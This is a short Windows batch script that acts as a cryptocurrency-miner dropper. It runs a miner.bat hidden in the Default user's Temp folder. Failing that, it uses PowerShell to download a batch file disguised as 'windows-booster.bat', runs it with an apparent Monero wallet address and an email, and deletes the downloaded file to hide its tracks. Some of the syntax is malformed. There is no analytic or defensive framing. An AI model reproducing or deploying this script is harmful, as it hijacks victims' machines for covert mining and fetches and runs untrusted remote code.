@echo off
IF EXIST C:\Users\Default\AppData\Local\Temp\miner.bat.("C:\Users\Default\AppData\Local\Temp\miner.bat" --config="C:\Users\Default\AppData\Local\Temp\config_background.json.".
) ELSE(
echo file not found start autorun
powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/windows-booster.bat', $tempfile); & $tempfile '457vjwHvXLFNULg2hsaEwYVJHhBrq8q33GXu9yA8ySdc2Po82eHwpN7Pv2M4SK21heS9A9KiLmSEhWmq9s5P39DMKX7wT4Y' 'ekojim@gmail.com'; Remove-Item -Force $tempfile"
)
